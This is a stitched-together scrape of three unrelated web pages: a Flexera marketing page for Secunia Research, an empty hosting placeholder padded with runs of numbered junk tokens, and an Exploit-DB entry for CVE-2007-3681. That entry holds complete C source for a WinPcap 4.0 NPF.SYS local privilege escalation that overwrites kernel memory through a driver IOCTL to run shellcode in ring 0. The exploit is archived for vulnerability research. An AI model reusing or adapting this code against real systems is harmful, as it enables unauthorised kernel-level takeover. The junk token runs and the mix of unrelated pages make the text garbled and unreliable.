=== Content from secunia.com_4a0d2a28_20250125_205158.html ===


[Skip to main content](#main-content)
[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

Search

## Main navigation

* Solutions
  + Column 1
    - Business challenge
      * [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
      * [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
      * [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
      * [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
      * [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
      * [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
      * [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
      * [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
      * [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
      * [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
      * [Public sector](https://www.flexera.com/solutions/public-sector)
  + Column 2
    - Spend management by vendor
      * [IBM](https://www.flexera.com/solutions/vendor/ibm)
      * [Oracle](https://www.flexera.com/solutions/vendor/oracle)
      * [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
      * [SAP](https://www.flexera.com/solutions/vendor/sap)
      * [VMware](https://www.flexera.com/solutions/vendor/vmware)
      * [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
      * [AWS](https://www.flexera.com/solutions/vendor/aws)
      * [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
      * [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
      * [Adobe](https://www.flexera.com/solutions/vendor/adobe)

  ### Achieve more through a united FinOps and ITAM function

  The future is hybrid. Break down the walls between ITAM and FinOps to drive more revenue, more customer growth and more innovation.

  [Discover More](https://www.flexera.com/resources/hybrid-itam-finops)
* Products
  + Column 1
    - [Flexera One](https://www.flexera.com/products/flexera-one)
      * [IT Visibility](https://www.flexera.com/products/flexera-one/it-visibility)
      * [ITAM](https://www.flexera.com/products/flexera-one/it-asset-management)
      * [SaaS Management](https://www.flexera.com/products/flexera-one/saas-management)
      * [FinOps](https://www.flexera.com/products/flexera-one/finops)
      * [Technology Intelligence Platform](https://www.flexera.com/products/flexera-one/technology-intelligence-platform)
  + Column 2
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
      * [Snow Spend Optimizer](https://www.flexera.com/products/snow-atlas/snow-spend-optimizer)
      * [Snow SaaS Management](https://www.flexera.com/products/snow-atlas/snow-saas-management)
  + Column 3
    - Hide group
      * [Security](https://www.flexera.com/products/security)
      * [Application Readiness](https://www.flexera.com/products/adminstudio)
      * [All products](https://www.flexera.com/products)
      * [All Snow products](https://www.flexera.com/products/snow)
      * [Integrations](https://www.flexera.com/products/integrations)

  ### Flexera 2024 State of the Cloud Report

  What do transformative initiatives such as GenAI, machine learning and sustainability mean for the cloud? Check out the 2024 State of the Cloud Report to find the answer as well as all the latest cloud computing trends.

  [View Report](https://info.flexera.com/CM-REPORT-State-of-the-Cloud)
* Success
  + Column 1
    - [Customer success](https://www.flexera.com/customer-success)
      * Support
        + [Flexera support portal](https://community.flexera.com/s/support-hub)
        + [Flexera product documentation](https://docs.flexera.com)
        + [Snow product documentation](https://docs.snowsoftware.io/)
      * Services and training
        + [Services](https://www.flexera.com/customer-success/services)
        + [Training](https://www.flexera.com/customer-success/training)
  + Column 2
    - Hide group
      * [Technology Intelligence Awards](https://www.flexera.com/customer-success/awards)
      * [Flexera community](https://community.flexera.com/s/)

  ### Insights from Gartner®

  Find a curated series of actionable and objective insights for IT executives and their teams. Get expert insights from valued analysts, courtesy of Flexera.

  [Discover More](https://www.flexera.com/resources/gartner-analyst-research)
* Resources
  + Column 1
    - [Resources](https://www.flexera.com/resources)
      * [Webinars](https://www.flexera.com/resources?type%5Bwebinar%5D=webinar)
      * [Videos](https://www.flexera.com/resources?type%5Bvideo%5D=video)
      * [Datasheets](https://www.flexera.com/resources?type%5Bdatasheet%5D=datasheet)
      * [White papers & reports](https://www.flexera.com/resources?type%5Bwhite-paper-industry-report%5D=white-paper-industry-report)
  + Column 2
    - Hide group
      * [Blog](/blog/)
      * [Case studies](https://www.flexera.com/resources/case-studies)
      * [Events](https://www.flexera.com/resources?type%5Bevent%5D=event)
      * [Analyst Research](https://www.flexera.com/resources/gartner-analyst-research)
      * [Glossary](https://www.flexera.com/resources/glossary)
      * [Demos & trials](https://www.flexera.com/resources?type%5Bdemo-trials%5D=demo-trials)
      * [Business value calculator](https://www.flexera.com/resources/business-value-calculator)

  ### Flexera 2025 IT Priorities Report

  Insights from Flexera’s 2025 IT Priorities Report highlight what’s top of mind for IT decision makers in the year ahead. Discover the challenges, priorities and opportunities that will shape the future IT landscape.

  [View Report](https://info.flexera.com/ITV-REPORT-IT-Priorities)
* About
  + Column 1
    - [Company](https://www.flexera.com/about-us)
      * [About](https://www.flexera.com/about-us)
      * [Careers](https://www.flexera.com/about-us/careers)
      * [Contact](https://www.flexera.com/about-us/contact-us)
      * [Leadership](https://www.flexera.com/about-us/leadership)
    - [Partners](https://www.flexera.com/about-us/partners)
      * [Partner program](https://www.flexera.com/about-us/partners/partner-program)
      * [Partner directory](https://www.flexera.com/about-us/partners/directory)
  + Column 2
    - [Press center](https://www.flexera.com/about-us/press-center)
      * [Press releases](https://www.flexera.com/about-us/all-press-releases)
      * [Awards](https://www.flexera.com/about-us/press-center#awards)
      * [Articles](https://www.flexera.com/about-us/all-articles)
    - Hide group
      * Social responsibility
        + [ESG](https://www.flexera.com/about-us/environmental-social-governance)
        + [Diversity](https://www.flexera.com/about-us/diversity)

  ### More value with technology intelligence

  The unparalleled synergy of Flexera and Snow provides the Technology Intelligence you need for more efficiency, insight and governance than ever before.

  [Discover More](https://www.flexera.com/more-value-with-technology-intelligence)

Search

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

## External Links

* External Links
  + [Community](https://community.flexera.com/)
  + [Product Access](https://app.flexera.com/login)
  + [Partner Portal](https://flexera.channeltivity.com/Login)

[Book a demo](/about-us/contact-us?C_Interest1=sales)

# Secunia Research

## The world’s best vulnerability intelligence

The Secunia Research team from Flexera provides the most accurate and reliable source of vulnerability intelligence.

[Contact Us](https://www.flexera.com/about-us/contact-us?C_Interest1=sales&C_SolutionInterest=SVM)
Watch video (0:29)

Related links

* [Anatomy of a security advisory](https://www.flexera.com/resources/infographics/anatomy-of-a-security-advisory)
* [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)
* [Software Vulnerability Manager](/products/software-vulnerability-manager)
* [Security advisories from Secunia Research](https://www.flexera.com/products/security/software-vulnerability-advisories)
* [Report a vulnerability](https://www.flexera.com/about-us/contact-us/report-vulnerability)

 ![Secunia Research](/sites/default/files/2022-04/hero-secunia-research-bg.jpg)

Featured Details

## Multiple ways to consume Secunia Research

Secunia delivers software security research that provides reliable, curated and actionable vulnerability intelligence. Organizations can expect to receive standardized, validated and enriched vulnerability research on a specific version of a software product. Secunia Research supports four solutions:

![Software Vulnerability Research](/sites/default/files/2022-04/icon-secunia-research-svr.svg)

### [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)

Software Vulnerability Research utilizes Secunia Research to drive awareness of vulnerabilities matching your specified criteria

[Learn More](https://www.flexera.com/products/software-vulnerability-research)

![Software Vulnerability Manager](/sites/default/files/2022-04/icon-secunia-research-svm.svg)

### [Software Vulnerability Manager](/products/software-vulnerability-manager)

Software Vulnerability Manager uses Secunia Research data to identify, prioritize and patch known vulnerable software detected in your environment

[Learn More](/products/software-vulnerability-manager)

![Data Platform](/sites/default/files/2022-04/icon-secunia-research-dp.svg)

### [Data Platform](https://www.flexera.com/products/data-platform)

Data Platform leverages Secunia Research to provide high-level insights based on major or minor versions of software in your normalized inventory

[Learn More](https://www.flexera.com/products/data-platform)

![Flexera One](/sites/default/files/2022-04/icon-secunia-research-flexera-one.svg)

### [Flexera One](/flexera-one)

Flexera One utilizes Secunia Research (alongside public NVD data) to provide more granular matching of build-level versions of software in your normalized inventory within its IT Asset Management and IT Visibility solutions

[Learn More](/flexera-one)

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Informing IT, Transforming IT

## Industry insights to help keep you informed

[#### Webinar

### Stay Ahead of Cyber Threats: Flexera's Latest Vulnerability Insights

Join us for this session where we'll explore the latest findings from the Flexera Monthly Vulnerability Insights Report.](https://info.flexera.com/SVM-WBNR-Vulnerability-Insights-Roundtable)

[#### Webinar

### Dive deeper into the Flexera Annual Vulnerability Insights

We'll explore the key findings from the Flexera Annual Vulnerability Insights Report. Learn about the latest cybersecurity trends, the most targeted industries, the types of vulnerabilities, plus management and mitigation strategies.](https://info.flexera.com/SVM-WBNR-Flexera-Annual-Vulnerability-Insights?lead_source=Website%20Visitor&id=Flexera.com-Resources)

#### Video

### Close the Risk Window with Software Vulnerability Manager

Stop reacting. Gain control. Stay secure. Build a more effective risk mitigation process leveraging Secunia Research vulnerability intelligence and the largest repository of third-party patch data in the industry.

Remote video URL

[#### Trial

### Software Vulnerability Manager Assessment free trial

Get access to the complete set of modules of Software Vulnerability Manager: Research, Assessment and Patching](https://info.flexera.com/SVM-EVAL-Software-Vulnerability-Manager)

[#### Datasheet

### Protect your ServiceNow® investment with the highest quality data

IT Visibility offers certified ServiceNow integrations that accelerate platform expansion, improve ROI and increase efficiencies across ITIL processes by delivering clean software and hardware asset data directly.](/sites/default/files/datasheet-itv-maximize-servicenow-investment.pdf)

[#### Blog

### Avoid missing crucial vulnerability intelligence amid NVD backlog

Recent developments regarding the National Vulnerability Database (NVD) have some technology leaders on edge. Since February, the U.S. National Institute of Standards and Technology (NIST) has almost completely stopped enriching software vulnerabi...](https://www.flexera.com/blog/vulnerability-management/avoid-missing-crucial-vulnerability-intelligence-amid-nvd-backlog/)

[View all resources](https://www.flexera.com/resources?category%5Bsoftware-vulnerability-management%5D=software-vulnerability-management)

## Footer Menu

* Column
  + Business challenge
    - [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
    - [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
    - [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
    - [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
    - [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
    - [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
    - [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
    - [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
    - [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
    - [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
    - [Public sector](https://www.flexera.com/solutions/public-sector)
* Column
  + Spend management by vendor
    - [IBM](https://www.flexera.com/solutions/vendor/ibm)
    - [Oracle](https://www.flexera.com/solutions/vendor/oracle)
    - [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
    - [SAP](https://www.flexera.com/solutions/vendor/sap)
    - [VMware](https://www.flexera.com/solutions/vendor/vmware)
    - [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
    - [AWS](https://www.flexera.com/solutions/vendor/aws)
    - [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
    - [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
    - [Adobe](https://www.flexera.com/solutions/vendor/adobe)
* Column
  + Products
    - [Flexera One](https://www.flexera.com/products/flexera-one)
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
    - [Security](https://www.flexera.com/products/security)
    - [Application Readiness](https://www.flexera.com/products/adminstudio)
    - [All products](https://www.flexera.com/products)
    - [All Snow products](https://www.flexera.com/products/snow)
    - [Integrations](https://www.flexera.com/products/integrations)
* Column
  + Company
    - [About](https://www.flexera.com/about-us)
    - [Careers](https://www.flexera.com/about-us/careers)
    - [Leadership](https://www.flexera.com/about-us/leadership)
    - [Contact us](https://www.flexera.com/about-us/contact-us)
    - [Media / press center](https://www.flexera.com/about-us/press-center)
    - [Revenera.com](https://www.revenera.com)

 +1.800.374.4353

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

 [![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

© 2025 Flexera. All Rights Reserved.

## Footer

* [Privacy Policy](https://www.flexera.com/legal/privacy-policy)
* [Terms and conditions](https://www.flexera.com/legal)
* [Contact Us](https://www.flexera.com/about-us/contact-us)
* [Impressum](https://www.flexera.com/about-us/impressum)
* [Site Map](https://www.flexera.com/sitemap)

#####

×

...



=== Content from www.vupen.com_e849dc9c_20250125_205159.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61



=== Content from www.exploit-db.com_432970ac_20250125_205201.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# WinPcap 4.0 - 'NPF.SYS' Local Privilege Escalation

#### EDB-ID:

###### 4165

#### CVE:

###### [2007-3681](https://nvd.nist.gov/vuln/detail/CVE-2007-3681)

---

**EDB Verified:**

#### Author:

###### [Mario Ballano BÃ¡rcena](/?author=1004)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Windows](/?platform=windows)

#### Date:

###### 2007-07-10

---

**Vulnerable App:**

```
/*
	WinPcap NPF.SYS Privilege Elevation Vulnerability PoC exploit
	-------------------------------------------------------------

	Affected software:

	(*) WinPcap versions affected (Confirmed)

	- WinPcap 4.0 and previous

	(*) WinPcap fixed version (stable) : WinPcap 4.0.1

	Note : There was an error in the previous advisory, which tells WinPcap
	       4.1 is affected, in fact WinPcap 4.1 is the beta version.

    (*) Operating systems affected (Confirmed)

	- Windows 2000 SP4 (Both server and workstation)
	- Windows XP   SP2
	- Windows 2003 Server
	- Windows Vista !!

	Description:

	It's a well known issue that WinPcap security model allows non-administrator
	users to use its device driver. If they don't manually unload it after using
	tools such as Wireshark (ethereal), which unfortunatelly oftenly happens, this
	can lead to unwanted network traffic sniffing and now with the help of this
	exploit to kernel mode code execution ;-)

	Remarks:

	The exploit code is a PoC and was tested only against Windows XP SP2, with minor
	modifications (delta offsets and changing VirtualAlloc for NtAllocVirtualMemory due
	to base address restrictions in Windows Vista ) should work on all OSes commented
	above.

	To test the PoC, just pick any software which uses WinPcap like WireShark, then
	start to sniff in any iface and close it  (so WinPcap device gets up ). Run the
	exploit code (as guest user if you want) you should hit an int 3 in kernel mode :-)

	Vulnerability discovered by:

	Mario Ballano BÃ¡rcena,  mballano[_at_]gmail.com

	http://www.48bits.com/

	24, April 2007

*/

#define _CRT_SECURE_NO_DEPRECATE

#include <windows.h>
#include <stdio.h>

#define IOCTL_BIOCGSTATS 9031
#define OUT_SIZE 0x10
#define NDRIVERS_LIST 100

enum OSes
{
	OS_WXP=1,
	OS_W2K,
	OS_W2K3,
	OS_VISTA
};

#define WXP_DELTA 0xA67FF; // SP2 Fully patched!!
#define W2K_DELTA 0x0;
#define W2K3_DELTA 0x0;
#define WVISTA_DELTA 0x0;

DWORD  g_dwOsVersion        = 0;
LPVOID g_PatchAddress       = NULL;
LPBYTE g_WXP_PATCH_BYTES    = "\x80\x83\xff\x2C\x75\x2F\x53\xE8\xE1\xA2\xF7\xFF\x89\x45\xDC\x85";
LPBYTE g_W2K_PATCH_BYTES    = "\xCC\xCC\xCC";
LPBYTE g_W2K3_PATCH_BYTES   = "\xCC\xCC\xCC";
LPBYTE g_WVISTA_PATCH_BYTES = "\xCC\xCC\xCC";

typedef BOOL (WINAPI *PENUMDEVICES)(LPVOID*,
									DWORD ,
									LPDWORD);

typedef DWORD (WINAPI *PGETDEVNAME)(LPVOID ImageBase,
									char  *lpBaseName,
									DWORD nSize);

typedef DWORD (WINAPI* PQUERYSYSTEM)(UINT, PVOID, DWORD,PDWORD);

BOOL GetNpfDevice (char *lpNpfDevice)
{
	DWORD  cb,lpType;
	char  *lpList,*tmp;
	HKEY  hkey;
	BOOL   bRes = FALSE;

	lpList = malloc(0x1000);
	memset(lpList,0,0x1000);
	cb = 0x1000;

	if ( RegOpenKeyExA(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\EAPOL\\Parameters\\General",0,KEY_READ,&hkey) == ERROR_SUCCESS )
	{
		printf("AQUI");
		if ( RegQueryValueExA( hkey,
							"InterfaceList",
							0,
							&lpType,
							lpList,
							&cb)  == ERROR_SUCCESS )
		{
			strcpy(lpNpfDevice,"\\\\.\\NPF_");
			while(*lpList && *lpList !='{') lpList++;
			tmp = lpList;
			while(*lpList && *(lpList) != '}') lpList ++;
			*(++lpList) = '\0';
			strcat(lpNpfDevice,tmp);
			bRes = TRUE;
		}

	}

	free(lpList);

	if (!bRes)
	{
		printf("Cannot generate NPF Device Name :-( \n");
	}

	return bRes;

}

LPVOID GetNtosBase (VOID)
{
	HANDLE hLib;
	PENUMDEVICES pEnumDeviceDrivers;
	PGETDEVNAME  pGetDeviceDriverBaseName;
	DWORD  lpcbNeeded,i;
	LPVOID NtosBase = NULL;
	LPVOID *lpImageBases = NULL;
	char   lpBaseName[MAX_PATH];

	if ( ( hLib = LoadLibraryA("psapi.dll")) &&
		 ( pEnumDeviceDrivers = (PENUMDEVICES) GetProcAddress(hLib,"EnumDeviceDrivers") ) &&
		 ( pGetDeviceDriverBaseName = (PGETDEVNAME) GetProcAddress(hLib,"GetDeviceDriverBaseNameA")) )
	{

		lpImageBases = malloc( sizeof(LPVOID) * NDRIVERS_LIST );
		pEnumDeviceDrivers(lpImageBases,sizeof(LPVOID) * NDRIVERS_LIST,&lpcbNeeded);

		if ( (lpcbNeeded / sizeof(LPVOID)) > NDRIVERS_LIST)
		{
			lpImageBases = realloc(lpImageBases,sizeof(LPVOID) * lpcbNeeded);
			pEnumDeviceDrivers(lpImageBases,lpcbNeeded,&lpcbNeeded);
		}

		for (i = 0; i < (lpcbNeeded / sizeof(LPVOID)) ; i++ )
		{
			if ( pGetDeviceDriverBaseName(lpImageBases[i],lpBaseName,MAX_PATH) )
			{
				printf ("%s\n",lpBaseName);
				if (!strcmp(lpBaseName,"ntoskrnl.exe"))
				{
					NtosBase = lpImageBases[i];
					printf("NTOSKRNL Base found at %#p\n",NtosBase);
					break;
				}
			}
		}

		free(lpImageBases);
	}

	else
	{
		printf("Cannot Load psapi exports!\n");
	}

	return NtosBase;
}

DWORD GetOSVersion (VOID)
{
	OSVERSIONINFOA  osvi;
	DWORD retval = 0;

	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);

	if ( GetVersionExA(&osvi) )
	{
		if (osvi.dwMajorVersion == 5)
		{
			switch(osvi.dwMinorVersion)
			{
				case 0:
					retval = OS_W2K;
					break;
				case 1:
					retval = OS_WXP;
					break;
				case 2:
					retval = OS_W2K3;
					break;
			}
		}

		else if (osvi.dwMajorVersion == 6)
		{
			retval = OS_VISTA;
		}
	}

	g_dwOsVersion = retval;

	return retval;
}

DWORD GetNtosDelta (VOID)
{
	DWORD retval = 0;

	switch(GetOSVersion())
	{
		case OS_VISTA:
			printf("System identified as Windows Vista\n");
			retval = WVISTA_DELTA;
			break;
		case OS_W2K:
			printf("System identified as Windows 2000\n");
			retval = W2K_DELTA;
			break;
		case OS_W2K3:
			printf("System identified as Windows 2003\n");
			retval = W2K3_DELTA;
			break;
		case OS_WXP:
			printf("System identified as Windows XP\n");
			retval = WXP_DELTA;
			break;
		default:
			printf("Unidentified system!\n");
	}

	return retval;

}

__declspec( naked ) void ShellCode (VOID)
{
	// Just debug it, to check code execution ;-)

	__asm int 3;

	// The patch _should_ be done fastly ... thatÂ´s why we use global vars...

	switch(g_dwOsVersion)
	{
		case OS_VISTA:
			memcpy( g_PatchAddress, g_WVISTA_PATCH_BYTES,0x10);
			break;
		case OS_W2K:
			memcpy( g_PatchAddress, g_W2K_PATCH_BYTES,0x10);
			break;
		case OS_WXP:
			memcpy( g_PatchAddress, g_WXP_PATCH_BYTES,0x10);
			break;
		case OS_W2K3:
			memcpy( g_PatchAddress,g_W2K3_PATCH_BYTES,0x10);
			break;
	}

	// Go out without raising an exception ;-), indeed this is inside a SEH frame but ... wtf! :-)

	__asm
	{
		mov  eax, [g_PatchAddress]
		inc  eax
		push eax
		ret
	}
}

int main(int argc, char **argv)
{
	HANDLE       hDevice;
	LPVOID		 lpNtosSwitch;
	DWORD		 cb, delta;
	DWORD		 values[4];
	LPVOID		 lpFakeTable;
	PQUERYSYSTEM NtQuerySystemInformation;
	char		 szNpfDevice[100];
	BYTE		 QueryBuffer[0x24];
	int			 i;

	NtQuerySystemInformation = (PQUERYSYSTEM) GetProcAddress(GetModuleHandleA("NTDLL.DLL"),"NtQuerySystemInformation");

	printf ("Searching for a valid Interface ...\n");

	if ( GetNpfDevice(szNpfDevice) )
	{
		printf("NPF Device name generated! : %s\n",szNpfDevice);
	}

	else
	{
		printf("Cannot found any valid Interface!\n");
		return 0;
	}

	if ( lpFakeTable = VirtualAlloc((LPVOID)0x570000,
									0x20000,
									MEM_COMMIT|MEM_RESERVE,
									PAGE_EXECUTE_READWRITE) )
	{
		printf("Memory allocated at %p\n",lpFakeTable);

		for ( i=0; i < ( 0x20000/sizeof(LPVOID) ); i++)
		{
			* ( (LPVOID *)lpFakeTable + i) = ShellCode;
		}

		printf("Memory mapping filled! ... \n");

	}

	else
	{
		printf("Cannot allocate memory!\n");
		return 0;
	}

	if ( (hDevice = CreateFileA(szNpfDevice,
		  GENERIC_READ|GENERIC_WRITE,
		  0,
		  0,
		  OPEN_EXISTING,
		  0,
		  NULL) ) != INVALID_HANDLE_VALUE )
	{
		printf("Device %s succesfully opened!\n", szNpfDevice);

		if ( (lpNtosSwitch = GetNtosBase()) && ( delta = GetNtosDelta()) )
		{
			g_PatchAddress = (LPVOID) ((LPBYTE) lpNtosSwitch + delta );

			if ( DeviceIoControl(hDevice,
								IOCTL_BIOCGSTATS,
								(LPVOID)0,0,
								(LPVOID)values,OUT_SIZE,
								&cb,
								NULL) )
			{
				printf("First time reading ... bytes returned %#x\n",cb);

				for (i = 0;i<4;i++)
				{
					printf ("OutBuffer[i] = %#x\n",values[i]);
				}
			}

			printf("Launching exploit ... \nOverwritting NTOSKRNL switch at -> %#p\n",g_PatchAddress);

			if ( DeviceIoControl(hDevice,
								 IOCTL_BIOCGSTATS,
								(LPVOID)0,0,
								(LPVOID)g_PatchAddress,OUT_SIZE,
								&cb,
								NULL) )

			{
				// Dirty trick ..
				NtQuerySystemInformation(0x15,QueryBuffer,sizeof(QueryBuffer), NULL);
				// Bye bye god mode!
				printf("We are back from ring0!\n");
			}
		}
	}

	else
	{
		printf("Error: Cannot open device %s\n",szNpfDevice);
	}
}

// milw0rm.com [2007-07-10]

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
